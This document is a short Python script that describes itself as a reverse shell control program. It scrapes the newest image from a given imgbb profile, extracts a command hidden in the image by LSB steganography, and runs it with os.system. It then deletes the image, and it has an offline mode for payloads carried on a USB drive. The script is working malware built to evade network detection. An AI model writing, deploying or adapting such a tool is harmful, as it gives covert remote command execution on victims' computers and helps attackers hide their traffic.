from stegano import lsb
import bs4
import click
import os
import requests
import shutil

@click.command()
@click.argument("user")
@click.option("-n", "--name", default="secret", help="Name of payload image file.", show_default=True)
@click.option("-o", "--offline", is_flag=True, default=False,
    help="Don't connect to imgbb and instead use a local file path to the payload file as the USER argument. For local use or use with a USB drive.")
def command(user, name, offline):
    """
    \b
       ,-,--.  ,--.--------.    ,----.       _,---.     _,.---._      ,-,--.   ,---.                                            ,-,--.  
     ,-.'-  _\/==/,  -   , -\,-.--` , \  _.='.'-,  \  ,-.' , -  `.  ,-.'-  _\.--.'  \     .--.-. .-.-. .-.,.---.  .--.-. .-.-.,-.'-  _\ 
    /==/_ ,_.'\==\.-.  - ,-./==|-  _.-` /==.'-     / /==/_,  ,  - \/==/_ ,_.'\==\-/\ \   /==/ -|/=/  |/==/  `   \/==/ -|/=/  /==/_ ,_.' 
    \==\  \    `--`\==\- \  |==|   `.-./==/ -   .-' |==|   .=.     \==\  \   /==/-|_\ |  |==| ,||=| -|==|-, .=., |==| ,||=| -\==\  \    
     \==\ -\        \==\_ \/==/_ ,    /|==|_   /_,-.|==|_ : ;=:  - |\==\ -\  \==\,   - \ |==|- | =/  |==|   '='  /==|- | =/  |\==\ -\   
     _\==\ ,\       |==|- ||==|    .-' |==|  , \_.' )==| , '='     |_\==\ ,\ /==/ -   ,| |==|,  \/ - |==|- ,   .'|==|,  \/ - |_\==\ ,\  
    /==/\/ _ |      |==|, ||==|_  ,`-._\==\-  ,    ( \==\ -    ,_ //==/\/ _ /==/-  /\ - \|==|-   ,   /==|_  . ,'.|==|-   ,   /==/\/ _ | 
    \==\ - , /      /==/ -//==/ ,     / /==/ _  ,  /  '.='. -   .' \==\ - , |==\ _.\=\.-'/==/ , _  .'/==/  /\ ,  )==/ , _  .'\==\ - , / 
     `--`---'       `--`--``--`-----``  `--`------'     `--`--''    `--`---' `--`        `--`..---'  `--`-`--`--'`--`..---'   `--`---'  
    Reverse shell control program that receives command and control payloads hidden in images using steganography techniques to keep network traffic undetected. 
    
    \b
    Arguments:
        USER: The imgbb profile, found in the url https://<USER>.imgbb.com, that is connected to the control script.
    """
    if(not offline):

        #Connect to imgbb
        profile = requests.get("https://" + user + ".imgbb.com")
        try:
            #If the connection is successful, get the images in the profile (ignore first 3 images that are imgbb related, not profile content)
            gallery = bs4.BeautifulSoup(profile.content, "html.parser").find_all("a", class_="image-container --media")
            conn = requests.get(gallery[0]['href'])
            link = bs4.BeautifulSoup(conn.content, "html.parser").find("meta", property="og:image")['content']
            
            #Go to image link for newest image in profile
            image = requests.get(link, stream = True)

            filename = os.path.dirname(__file__) + "\\" + name + ".PNG"
            #Download image and save it as [name].png in the same directory as this file
            with open(filename, "wb") as file:
                shutil.copyfileobj(image.raw, file)
            print("Successfully downloaded payload image: ", filename)

            #Get payload from image and then run it
            payload = lsb.reveal(filename)
            os.system(payload)

            #Delete the downloaded payload image now that we are done with it
            os.remove(filename)
        except requests.exceptions.RequestException as e:
            #If the connection to imgbb is unsuccessful or another error comes up, raise it
            raise SystemExit(e)
    else:
        payload = lsb.reveal(user)
        os.system(payload)

if __name__ == '__main__':
    command()
